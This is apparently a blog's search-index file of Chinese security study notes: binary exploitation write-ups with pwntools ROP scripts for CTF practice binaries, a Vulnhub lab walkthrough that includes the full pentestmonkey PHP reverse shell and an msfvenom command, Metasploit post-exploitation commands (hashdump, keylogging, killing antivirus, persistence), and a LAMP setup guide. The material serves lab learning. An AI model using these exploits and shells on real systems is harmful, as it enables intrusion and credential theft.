<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[基本栈溢出利用]]></title>
    <url>%2F2019%2F04%2F28%2Ftest%2F</url>
    <content type="text"><![CDATA[常用命令 函数名查询 ns binary | grep &#39; t &#39; GOT表 readelf --relocs binary PLT表 objdump -M intel -dj .plt binary 字符串 rabin2 -z binary rooper pipenv run ropper --file binary --search &quot;xor&quot; vmmap 不同段权限 pwntools相关context(os=&#39;linux&#39;, arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) gdb.attach(sh,&#39;b *0xbb&#39;) r.sendline(asm(shellcraft.sh())) 基础ROPret2text简单来说就是跳转到程序本身已有的代码，程序中如果有调用system(“/bin/sh”)的代码，直接将函数返回地址覆盖为目标地址。算偏移量可以使用pattern offset。 一个样例payload 1234567##!/usr/bin/env pythonfrom pwn import *sh = process('./ret2text')target = 0x804863ash.sendline('A' * (0x6c+4) + p32(target))sh.interactive() ret2shellcode控制程序执行shellcode代码，shellcode一般自己填充，shellcode所在的区域需要有可执行权限。 shellcode可以pwntools生成，或者https://www.exploit-db.com/ 在线查找。也可以使用MSF生成。 bss段执行123456789101112int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts("No system for you this time !!!"); gets((char *)&amp;v4); strncpy(buf2, (const char *)&amp;v4, 0x64u); printf("bye bye ~"); return 0;&#125; payload 123456789#!/usr/bin/env pythonfrom pwn import *sh = process('./ret2shellcode')shellcode = asm(shellcraft.sh())buf2_addr = 0x804a080sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))sh.interactive() jmp esp这里列举两道题 第一道空间充足，可以直接jmp esp 1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf; // [esp+1Ch] [ebp-64h] init(); puts("**************************************"); puts("welcome to exploit train"); puts("**************************************"); read(0, &amp;buf, 0x200u); return puts("see you~~");&#125; payload 123456from pwn import *sh = process('./Bin')shellcode = asm(shellcraft.sh())jmp_esp = 0x080484f0sh.sendline(112*'A'+p32(jmp_esp)+shellcode)sh.interactive() 原理是函数执行完ret后，esp从指向返回地址变为指向esp+4,ret可以理解为pop eip. 如果空间不足，没有充足的空间放置shellcode.可以产生类似sub esp 0x28;jmp esp指令，返回填充的最开头。 一个payload 1234567891011121314from pwn import *sh = process('./pwn6')shellcode_x86 = "x31xc9xf7xe1x51x68x2fx2fx73"shellcode_x86 += "x68x68x2fx62x69x6ex89xe3xb0"shellcode_x86 += "x0bxcdx80"sub_esp_jmp = asm('sub esp, 0x28;jmp esp')jmp_esp = 0x08048504payload = shellcode_x86 + ( 0x20 - len(shellcode_x86)) * 'b' + 'bbbb' + p32(jmp_esp) + sub_esp_jmpsh.sendline(payload)sh.interactive() ret2syscall控制程序执行系统调用 Syscall的函数调用规范为 execve(&quot;/bin/sh&quot;,0,0); 对应汇编为 12345pop eax, # 系统调用号载入 execve为0xbpop ebx, # 第一个参数 /bin/shpop ecx, # 第二个参数 0pop edx, # 第三个参数，0int 0x80, # 执行系统调用 一个payload 12345678910111213#!/usr/bin/env pythonfrom pwn import *sh = process('./rop')pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90int_0x80 = 0x08049421binsh = 0x80be408payload = flat( ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])sh.sendline(payload)sh.interactive() ret2libc控制函数执行libc中的函数，通常返回至某个函数的plt处或者函数的具体位置（即函数对应的got表项的内容） ret2libc11234567891011121314151617int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts("RET2LIBC &gt;_&lt;"); gets((char *)&amp;v4); return 0;&#125;ret2libc1 ROPgadget --binary ret2libc1 --string '/bin/sh' Strings information============================================================0x08048720 : /bin/sh.plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND] payload 1234567891011#!/usr/bin/env pythonfrom pwn import *sh = process('./ret2libc1')binsh_addr = 0x8048720system_plt = 0x08048460payload = flat(['a' * 112, system_plt, 'b' * 4, binsh_addr])sh.sendline(payload)sh.interactive() 在正常调用system函数的时候，堆栈位置的system_plt之后的内容为system函数的返回地址，在之后才是新的堆栈的栈顶位置，因此在system_plt和sh_addr之间增加了4个字符来进行填充。 ret2libc21234567891011121314##!/usr/bin/env pythonfrom pwn import *sh = process('./ret2libc2')gets_plt = 0x08048460system_plt = 0x08048490pop_ebx = 0x0804843dbuf = 0x804a040payload = flat( ['a' * 112, gets_plt, pop_ebx, buf, system_plt, 0xdeadbeef, buf])sh.sendline(payload)sh.sendline('/bin/sh')sh.interactive() 这里有几个点，buf的地址其实可以在buf段任意选取。pop_ebx 也可以任意选择pop指令，实际上是pop ebp;ret,目的是将esp+4。 1234567A*112gets_addrpopbufsystem_addr0xdeedbeefbuf ret2libc3ROPemporium八道ROP的练习题，每道题都有32位和64位的版本。 ret2win321234567891011121314151617181920212223242526272829int __cdecl main(int argc, const char **argv, const char **envp)&#123; setvbuf(stdout, 0, 2, 0); setvbuf(stderr, 0, 2, 0); puts("ret2win by ROP Emporium"); puts("32bits\n"); pwnme(); puts("\nExiting"); return 0;&#125;char *pwnme()&#123; char s; // [esp+0h] [ebp-28h] memset(&amp;s, 0, 0x20u); puts( "For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;\n" "What could possibly go wrong?"); puts("You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!\n"); printf("&gt; "); return fgets(&amp;s, 50, stdin);&#125;int ret2win()&#123; printf("Thank you! Here's your flag:"); return system("/bin/cat flag.txt");&#125; payload 123456789from pwn import *sh = process('./ret2win32')payload = 'A'*44 + p32(0x08048659)sh.sendline(payload)sh.interactive() ret2winlinux_64与linux_86的区别主要有两点：首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上。 这里溢出就不是x86 PC的 0x41414141这样的地址，这时可以通过栈顶的数值计算。即rsp的内容。 1234567891011121314151617181920212223242526272829303132333435363738394041[----------------------------------registers-----------------------------------]RAX: 0x7fffffffde20 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")RBX: 0x0 RCX: 0x6241414641413041 ('A0AAFAAb')RDX: 0x7ffff7dd3790 --&gt; 0x0 RSI: 0x602041 ("AA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA\n")RDI: 0x7fffffffde51 --&gt; 0x3000000000004000 ('')RBP: 0x6141414541412941 ('A)AAEAAa')RSP: 0x7fffffffde48 ("AA0AAFAAb")RIP: 0x400810 (&lt;pwnme+91&gt;: ret)R8 : 0x41412d4141434141 ('AACAA-AA')R9 : 0x413b414144414128 ('(AADAA;A')R10: 0x6141414541412941 ('A)AAEAAa')R11: 0x246 R12: 0x400650 (&lt;_start&gt;: xor ebp,ebp)R13: 0x7fffffffdf30 --&gt; 0x1 R14: 0x0 R15: 0x0EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x400809 &lt;pwnme+84&gt;: call 0x400620 &lt;fgets@plt&gt; 0x40080e &lt;pwnme+89&gt;: nop 0x40080f &lt;pwnme+90&gt;: leave =&gt; 0x400810 &lt;pwnme+91&gt;: ret 0x400811 &lt;ret2win&gt;: push rbp 0x400812 &lt;ret2win+1&gt;: mov rbp,rsp 0x400815 &lt;ret2win+4&gt;: mov edi,0x4009e0 0x40081a &lt;ret2win+9&gt;: mov eax,0x0[------------------------------------stack-------------------------------------]0000| 0x7fffffffde48 ("AA0AAFAAb")0008| 0x7fffffffde50 --&gt; 0x400062 --&gt; 0x1f8000000000000 0016| 0x7fffffffde58 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;: mov edi,eax)0024| 0x7fffffffde60 --&gt; 0x0 0032| 0x7fffffffde68 --&gt; 0x7fffffffdf38 --&gt; 0x7fffffffe2a1 ("/home/pwn/rop_emporium_all_challenges/ret2win/ret2win")0040| 0x7fffffffde70 --&gt; 0x100000000 0048| 0x7fffffffde78 --&gt; 0x400746 (&lt;main&gt;: push rbp)0056| 0x7fffffffde80 --&gt; 0x0 [------------------------------------------------------------------------------]Legend: code, data, rodata, valueStopped reason: SIGSEGV0x0000000000400810 in pwnme () payload 12345678910from pwn import *sh = process('./ret2win')ret = 0x0000000000400811payload = 'A'*40 + p64(ret)sh.sendline(payload)sh.interactive() split32123456789101112131415161718192021222324int __cdecl main(int argc, const char **argv, const char **envp)&#123; setvbuf(stdout, 0, 2, 0); setvbuf(stderr, 0, 2, 0); puts("split by ROP Emporium"); puts("32bits\n"); pwnme(); puts("\nExiting"); return 0;&#125;char *pwnme()&#123; char s; // [esp+0h] [ebp-28h] memset(&amp;s, 0, 0x20u); puts("Contriving a reason to ask user for data..."); printf("&gt; "); return fgets(&amp;s, 96, stdin);&#125;int usefulFunction()&#123; return system("/bin/ls");&#125; IDA中使用快捷键shift+f12可以直接看到程序中的所有字符串 这里的目的是将/bin/cat flag.txt参数传入system函数 这里是32位程序，函数的参数是放在栈上的，payload如下。 12345678910from pwn import *sh = process('./split32')ss = 0x0804a030func = 0x08048657payload = 'A'*44 + p32(func)+p32(ss)sh.sendline(payload)sh.interactive() 1234567891011121314.text:08048649 usefulFunction proc near.text:08048649 ; __unwind &#123;.text:08048649 push ebp.text:0804864A mov ebp, esp.text:0804864C sub esp, 8.text:0804864F sub esp, 0Ch.text:08048652 push offset command ; &quot;/bin/ls&quot;.text:08048657 call _system.text:0804865C add esp, 10h.text:0804865F nop.text:08048660 leave.text:08048661 retn.text:08048661 ; &#125; // starts at 8048649.text:08048661 usefulFunction endp 这里使用的方法是直接调用usefulFunction中的system函数，调用之前栈顶是/bin/cat flag 另一种办法是调用.plt的system函数，payload如下。 123456789101112#!/usr/bin/python#coding:utf-8from pwn import *context.log_level = 'debug'p = process('./split32')catflag = 0x0804a030system = 0x08048430payload = 'a'*(0x28+0x04) +p32(system)+'aaaa'+p32(catflag)p.sendline(payload)p.interactive() 这里的aaaa就是system函数的返回地址。 split关键位置 1234567891011.text:0000000000400807 usefulFunction proc near.text:0000000000400807 ; __unwind &#123;.text:0000000000400807 push rbp.text:0000000000400808 mov rbp, rsp.text:000000000040080B mov edi, offset command ; "/bin/ls".text:0000000000400810 call _system.text:0000000000400815 nop.text:0000000000400816 pop rbp.text:0000000000400817 retn.text:0000000000400817 ; &#125; // starts at 400807.text:0000000000400817 usefulFunction endp 这里64位程序不是栈上传参，而是利用rdi来传递第一个参数，那么需要pop rdi;ret这个gadget. 1234567891011121314151617181920pwn@ubuntu:~/rop_emporium_all_challenges/split$ pipenv run ropper --file split --search "pop|rdi"[INFO] Load gadgets for section: PHDR[LOAD] loading... 100%[INFO] Load gadgets for section: LOAD[LOAD] loading... 100%[LOAD] removing double gadgets... 100%[INFO] Searching for gadgets: pop|rdi[INFO] File: split0x000000000040087c: pop r12; pop r13; pop r14; pop r15; ret; 0x000000000040087e: pop r13; pop r14; pop r15; ret; 0x0000000000400880: pop r14; pop r15; ret; 0x0000000000400882: pop r15; ret; 0x000000000040069f: pop rbp; mov edi, 0x601080; jmp rax; 0x000000000040087b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 0x000000000040087f: pop rbp; pop r14; pop r15; ret; 0x00000000004006b0: pop rbp; ret; 0x0000000000400883: pop rdi; ret; 0x0000000000400881: pop rsi; pop r15; ret; 0x000000000040087d: pop rsp; pop r13; pop r14; pop r15; ret; 类似，两种利用方式payload. 12345678910111213from pwn import *sh = process('./split')pop_rdi = 0x0000000000400883system = 0x0000000000400810cat = 0x00601060payload = 'A'*40 + p64(pop_rdi) + p64(cat) + p64(system)sh.sendline(payload)sh.interactive() 123456789101112#!/usr/bin/python#coding:utf-8from pwn import *context.log_level = 'debug'p = process('./split')catflag = 0x601060system = 0x4005e0pop_rdi_ret = 0x400883payload = 'a'*(0x20 + 0x08) + p64(pop_rdi_ret) +p64(catflag)+p64(system)p.sendline(payload)p.interactive()]]></content>
  </entry>
  <entry>
    <title><![CDATA[TopHatSec:Freshly- Vulnhub]]></title>
    <url>%2F2018%2F10%2F26%2FFreshly-Vulnhub%2F</url>
    <content type="text"><![CDATA[TopHatSec: Freshly- Vulnhub参考:http://www.freebuf.com/column/162631.htmlhttps://www.ins1gn1a.com/vulnhub-freshly-vm/ 靶机下载地址https://www.vulnhub.com/entry/tophatsec-freshly,118/ 渗透过程 端口扫描 12345678910nmap -sS 192.168.50.78Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-25 08:37 EDTNmap scan report for Freshly (192.168.50.78)Host is up (0.88s latency).Not shown: 996 closed portsPORT STATE SERVICE80/tcp open http443/tcp open https514/tcp filtered shell8080/tcp open http-proxy 123456789101112131415161718192021222324252627282930nmap -A 192.168.50.78Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-25 08:38 EDTNmap scan report for Freshly (192.168.50.78)Host is up (0.016s latency).Not shown: 996 closed portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.7 ((Ubuntu))|_http-server-header: Apache/2.4.7 (Ubuntu)|_http-title: Site doesn&apos;t have a title (text/html).443/tcp open ssl/http Apache httpd|_http-server-header: Apache|_http-title: Site doesn&apos;t have a title (text/html).| ssl-cert: Subject: commonName=www.example.com| Not valid before: 2015-02-17T03:30:05|_Not valid after: 2025-02-14T03:30:05514/tcp filtered shell8080/tcp open http Apache httpd|_http-server-header: Apache|_http-title: Site doesn&apos;t have a title (text/html).Aggressive OS guesses: Actiontec MI424WR-GEN3I WAP (99%), DD-WRT v24-sp2 (Linux 2.4.37) (98%), Linux 3.2 (98%), Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012 (96%), Linux 4.4 (96%), Microsoft Windows XP SP3 (96%), BlueArc Titan 2100 NAS device (91%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsTRACEROUTE (using port 80/tcp)HOP RTT ADDRESS1 0.12 ms 10.10.10.22 0.13 ms Freshly (192.168.50.78)OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 33.19 seconds nikto 12345678910111213141516171819202122232425root@kali:~# nikto -host http://192.168.50.78- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 192.168.50.78+ Target Hostname: 192.168.50.78+ Target Port: 80+ Start Time: 2018-10-25 08:43:38 (GMT-4)---------------------------------------------------------------------------+ Server: Apache/2.4.7 (Ubuntu)+ Server leaks inodes via ETags, header found with file /, fields: 0x2f 0x50f4228b8016c + The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ No CGI Directories found (use &apos;-C all&apos; to force check all possible dirs)+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS + Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.5+ Uncommon header &apos;x-ob_mode&apos; found, with contents: 0+ OSVDB-3233: /icons/README: Apache default file found.+ /login.php: Admin login page/section found.+ /phpmyadmin/: phpMyAdmin directory found+ 7686 requests: 0 error(s) and 11 item(s) reported on remote host+ End Time: 2018-10-25 08:43:50 (GMT-4) (12 seconds)---------------------------------------------------------------------------+ 1 host(s) tested 使用wpscan 1wpscan --url http://192.168.50.78:8080/wordpress sqlmap12345678910111213141516171819202122232425262728293031323334353637383940python sqlmap.py -u &quot;http://192.168.50.78/login.php&quot; --form ___ __H__ ___ ___[.]_____ ___ ___ &#123;1.2.10.27#dev&#125;|_ -| . [(] | .&apos;| . ||___|_ [&apos;]_|_|_|__,| _| |_|V |_| http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&apos;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 09:38:28[09:38:28] [INFO] testing connection to the target URL[09:38:28] [INFO] heuristics detected web page charset &apos;ascii&apos;[09:38:28] [INFO] searching for forms[#1] form:POST http://192.168.50.78:80/login.phpPOST data: user=&amp;password=&amp;s=Submitdo you want to test this form? [Y/n/q] &gt; Edit POST data [default: user=&amp;password=&amp;s=Submit] (Warning: blank fields detected): do you want to fill blank fields with random values? [Y/n] [09:38:34] [INFO] resuming back-end DBMS &apos;mysql&apos; [09:38:34] [INFO] using &apos;/root/.sqlmap/output/results-10252018_0938am.csv&apos; as the CSV results file in multiple targets mode[09:38:34] [INFO] heuristics detected web page charset &apos;ascii&apos;sqlmap resumed the following injection point(s) from stored session:---Parameter: user (POST) Type: AND/OR time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: user=DIaW&apos; AND (SELECT * FROM (SELECT(SLEEP(5)))iUZw)-- lBgc&amp;password=&amp;s=Submit---do you want to exploit this SQL injection? [Y/n] [09:38:34] [INFO] the back-end DBMS is MySQLweb server operating system: Linux Ubuntuweb application technology: Apache 2.4.7, PHP 5.5.9back-end DBMS: MySQL &gt;= 5.0.12[09:38:34] [INFO] you can find results of scanning in multiple targets mode inside the CSV file &apos;/root/.sqlmap/output/results-10252018_0938am.csv&apos;[*] shutting down at 09:38:34 这里还试着用了一个目录爆破工具 https://github.com/Strikersb/webdirscan 12 sqlmap找到用户名密码后,登录普通的登录界面并没有什么用,这里要找到wordpress的后台登录页面进行登录. 这里貌似就是经验问题,我一直找不到/wp-admin,这个页面,以后应该可以尝试暴力以下. 有时间可以看一下别人的扫描脚本怎么写的 登录到wordpress之后就是要上传php反弹shell了. 这里把404页面修改了,反弹shell用的是http://pentestmonkey.net/tools/web-shells/php-reverse-shell 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189&lt;?php// php-reverse-shell - A Reverse Shell implementation in PHP// Copyright (C) 2007 pentestmonkey@pentestmonkey.net//// This tool may be used for legal purposes only. Users take full responsibility// for any actions performed using this tool. The author accepts no liability// for damage caused by this tool. If these terms are not acceptable to you, then// do not use this tool.//// In all other respects the GPL version 2 applies://// This program is free software; you can redistribute it and/or modify// it under the terms of the GNU General Public License version 2 as// published by the Free Software Foundation.//// This program is distributed in the hope that it will be useful,// but WITHOUT ANY WARRANTY; without even the implied warranty of// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the// GNU General Public License for more details.//// You should have received a copy of the GNU General Public License along// with this program; if not, write to the Free Software Foundation, Inc.,// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.//// This tool may be used for legal purposes only. Users take full responsibility// for any actions performed using this tool. If these terms are not acceptable to// you, then do not use this tool.//// You are encouraged to send comments, improvements or suggestions to// me at pentestmonkey@pentestmonkey.net//// Description// -----------// This script will make an outbound TCP connection to a hardcoded IP and port.// The recipient will be given a shell running as the current user (apache normally).//// Limitations// -----------// proc_open and stream_set_blocking require PHP version 4.3+, or 5+// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.// Some compile-time options are needed for daemonisation (like pcntl, posix). These are rarely available.//// Usage// -----// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.set_time_limit (0);$VERSION = &quot;1.0&quot;;$ip = &apos;127.0.0.1&apos;; // CHANGE THIS$port = 1234; // CHANGE THIS$chunk_size = 1400;$write_a = null;$error_a = null;$shell = &apos;uname -a; w; id; /bin/sh -i&apos;;$daemon = 0;$debug = 0;//// Daemonise ourself if possible to avoid zombies later//// pcntl_fork is hardly ever available, but will allow us to daemonise// our php process and avoid zombies. Worth a try...if (function_exists(&apos;pcntl_fork&apos;)) &#123; // Fork and have the parent process exit $pid = pcntl_fork(); if ($pid == -1) &#123; printit(&quot;ERROR: Can&apos;t fork&quot;); exit(1); &#125; if ($pid) &#123; exit(0); // Parent exits &#125; // Make the current process a session leader // Will only succeed if we forked if (posix_setsid() == -1) &#123; printit(&quot;Error: Can&apos;t setsid()&quot;); exit(1); &#125; $daemon = 1;&#125; else &#123; printit(&quot;WARNING: Failed to daemonise. This is quite common and not fatal.&quot;);&#125;// Change to a safe directorychdir(&quot;/&quot;);// Remove any umask we inheritedumask(0);//// Do the reverse shell...//// Open reverse connection$sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) &#123; printit(&quot;$errstr ($errno)&quot;); exit(1);&#125;// Spawn shell process$descriptorspec = array( 0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;), // stdin is a pipe that the child will read from 1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;), // stdout is a pipe that the child will write to 2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;) // stderr is a pipe that the child will write to);$process = proc_open($shell, $descriptorspec, $pipes);if (!is_resource($process)) &#123; printit(&quot;ERROR: Can&apos;t spawn shell&quot;); exit(1);&#125;// Set everything to non-blocking// Reason: Occsionally reads will block, even though stream_select tells us they won&apos;tstream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);printit(&quot;Successfully opened reverse shell to $ip:$port&quot;);while (1) &#123; // Check for end of TCP connection if (feof($sock)) &#123; printit(&quot;ERROR: Shell connection terminated&quot;); break; &#125; // Check for end of STDOUT if (feof($pipes[1])) &#123; printit(&quot;ERROR: Shell process terminated&quot;); break; &#125; // Wait until a command is end down $sock, or some // command output is available on STDOUT or STDERR $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); // If we can read from the TCP socket, send // data to process&apos;s STDIN if (in_array($sock, $read_a)) &#123; if ($debug) printit(&quot;SOCK READ&quot;); $input = fread($sock, $chunk_size); if ($debug) printit(&quot;SOCK: $input&quot;); fwrite($pipes[0], $input); &#125; // If we can read from the process&apos;s STDOUT // send data down tcp connection if (in_array($pipes[1], $read_a)) &#123; if ($debug) printit(&quot;STDOUT READ&quot;); $input = fread($pipes[1], $chunk_size); if ($debug) printit(&quot;STDOUT: $input&quot;); fwrite($sock, $input); &#125; // If we can read from the process&apos;s STDERR // send data down tcp connection if (in_array($pipes[2], $read_a)) &#123; if ($debug) printit(&quot;STDERR READ&quot;); $input = fread($pipes[2], $chunk_size); if ($debug) printit(&quot;STDERR: $input&quot;); fwrite($sock, $input); &#125;&#125;fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);// Like print, but does nothing if we&apos;ve daemonised ourself// (I can&apos;t figure out how to redirect STDOUT like a proper daemon)function printit ($string) &#123; if (!$daemon) &#123; print &quot;$string\n&quot;; &#125;&#125;?&gt; 这里我也可以用msf生成 msfvenom -p php/reverse_php LHOST=192.168.50.226 LPORT=4444 -o/root/Desktop/shell123.php 拿到shell以后就可以查看/etc/passwd和 /etc/shadow]]></content>
  </entry>
  <entry>
    <title><![CDATA[Metasploit基础]]></title>
    <url>%2F2018%2F10%2F26%2FMetasploit%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[Metasploit 技术基础基本模块Auxiliaries(辅助模块)Exploit(漏洞利用模块)Payload(攻击载荷模块)Post(后期渗透模块)Encoders(编码工具模块)渗透攻击步骤 扫描目标系统,寻找可用漏洞 选择并配置一个漏洞利用模块 选择并配置一个攻击载荷模块 选择一个编码技术,用来绕过杀毒软件的查杀 渗透攻击 主机扫描使用辅助模块进行端口扫描search portscan setg命令和unsetg命令可以设置全局性的参数值,从而避免重复输入相同的值. 使用辅助模块进行服务扫描search scanner 使用Nmap扫描假设现在攻击一台XP MS08067漏洞主机,可以使用nmap插件.nmap -sT -A --script=smb-vuln-ms08-067 -P0 10.10.10.152-sT 是指隐秘的TCP连接扫描(Stealth TCP connect)-sS 隐秘的TCP Syn扫描-A是指高级操作系统探测功能 XP ms08067 攻击过程123456789search ms08_067_netapiuse exploit/windows/smb/ms08_067_netapiset PAYLOAD windows/meterpreter/reverse_tcpshow targetsset TARGET 6set RHOST 10.10.10.152set LHOST 10.10.10.151show optionsexploit Meterpreter 截屏 screenshot sysinfo 键盘记录 run post/windows/capture/keylog_recorder 获取密码哈希值use privrun post/windows/gather/hashdump ps获取目标机正在运行的进程 getpid查看Meterpreter Shell的进程号 进程迁移 migrate run post/windows/manage/migrate 查看是否运行在虚拟机上 run post/windows/gather/checkvm idletime 目标机最近的运行时间 route 查看完整的网络进程 getuid 查看已经渗透的用户名 run post/windows/manage/killav 关闭目标机杀毒软件 run post/windows/manage/enable_rdp 启动目标机的远程桌面协议 run post/windows/manage/autoroute 查看目标机的本地子网情况 run post/windows/gather/enum_logged_on_users 列举当前有多少用户登录了目标机 pwd 或 getwd 查看当前处于目标机的哪个目录 getlwd 查看当前处于本地的哪个目录 ls 列出当前目录中的所有文件 cd 切换目录 search -f *.txt -d c:\: 搜索C盘中所有以txt为扩展名的文件, -f 参数用于指定搜索文件模式, -d 参数用于指定在哪个目录下进行搜索 download c:\test.txt /root 下载目标机C盘文件到攻击机root下 upload /root/text.txt c:\: 上传root目录下txt到目标机C盘 run packetrecorder -i 1 查看目标机上所有流量 控制持久化 run persistence -X -i 50 -p 443 -r 192.168.1.107 攻击Metasploitable2 过程12345678nmap -sV 10.10.10.134search vsftpduse exploit/unix/ftp/vsftpd_234_backdoorset PAYLOAD cmd/unix/interactset RHOST 10.10.10.134exploit -zsessions -u 3sessions -i 4 使用了sessions -u 命令将命令行shell升级为Meterpreter需要使用setg设置LHOST和LPORT参数exploit -z命令允许在成功攻击目标后暂时不适用控制会话进行交互. 跳板攻击权限提升后门CymothoaPersistence]]></content>
  </entry>
  <entry>
    <title><![CDATA[SQLi-lab 环境搭建]]></title>
    <url>%2F2018%2F10%2F23%2FSQLi-lab%2F</url>
    <content type="text"><![CDATA[SQLi-lab 环境搭建文章参考:’https://www.digitalocean.com/community/tutorials/how-to-install-linux-apache-mysql-php-lamp-stack-ubuntu-18-04&#39; 以下只用于非生产环境使用 安装Apache12sudo apt updatesudo apt install apache2 安装MySQL12sudo apt install mysql-serversudo mysql_secure_installation 安装PHP1sudo apt install php libapache2-mod-php php-mysql 测试1sudo vi /var/www/html/info.php 123&lt;?phpphpinfo();?&gt; http://your_server_ip/info.php sudo rm /var/www/html/info.php 安装phpMyAdmin###安装12sudo apt updatesudo apt install phpmyadmin php-mbstring php-gettext 服务器选择apache2使用dbconfig-common建立数据库设置phpmyadmin的mysql密码 安装过程将phpMyAdmin Apache配置文件添加到/etc/apache2/conf-enabled/目录中，并自动读取该文件。启用mbstringPHP扩展.12sudo phpenmod mbstringsudo systemctl restart apache2 创建phpMyAdmin快捷方式：sudo ln -s /usr/share/phpmyadmin /var/www/html 1234567891011121314151617181920212223242526272829303132333435363738要以root用户身份登录phpMyAdmin ，您需要将其身份验证方法切换为auth_socket，mysql_native_password如果您还没有这样做。为此，请从终端打开MySQL提示符：sudo mysql接下来，使用以下命令检查每个MySQL用户帐户使用的身份验证方法：SELECT user,authentication_string,plugin,host FROM mysql.user;Output+------------------+-------------------------------------------+-----------------------+-----------+| user | authentication_string | plugin | host |+------------------+-------------------------------------------+-----------------------+-----------+| root | | auth_socket | localhost || mysql.session | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | mysql_native_password | localhost || mysql.sys | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | mysql_native_password | localhost || debian-sys-maint | *8486437DE5F65ADC4A4B001CA591363B64746D4C | mysql_native_password | localhost || phpmyadmin | *5FD2B7524254B7F81B32873B1EA6D681503A5CA9 | mysql_native_password | localhost |+------------------+-------------------------------------------+-----------------------+-----------+5 rows in set (0.00 sec)在此示例中，您可以看到root用户确实使用auth_socket插件进行身份验证。要配置root帐户以使用密码进行身份验证，请运行以下ALTER USER命令。请务必更改password为您选择的强密码：ALTER USER &apos;root&apos;@&apos;localhost&apos; IDENTIFIED WITH mysql_native_password BY &apos;password&apos;;然后，运行FLUSH PRIVILEGES告诉服务器重新加载授权表并使您的新更改生效：FLUSH PRIVILEGES;再次检查每个用户使用的身份验证方法，以确认root用户不再使用该auth_socket插件进行身份验证：SELECT user,authentication_string,plugin,host FROM mysql.user;Output+------------------+-------------------------------------------+-----------------------+-----------+| user | authentication_string | plugin | host |+------------------+-------------------------------------------+-----------------------+-----------+| root | *DE06E242B88EFB1FE4B5083587C260BACB2A6158 | mysql_native_password | localhost || mysql.session | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | mysql_native_password | localhost || mysql.sys | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | mysql_native_password | localhost || debian-sys-maint | *8486437DE5F65ADC4A4B001CA591363B64746D4C | mysql_native_password | localhost || phpmyadmin | *5FD2B7524254B7F81B32873B1EA6D681503A5CA9 | mysql_native_password | localhost |+------------------+-------------------------------------------+-----------------------+-----------+5 rows in set (0.00 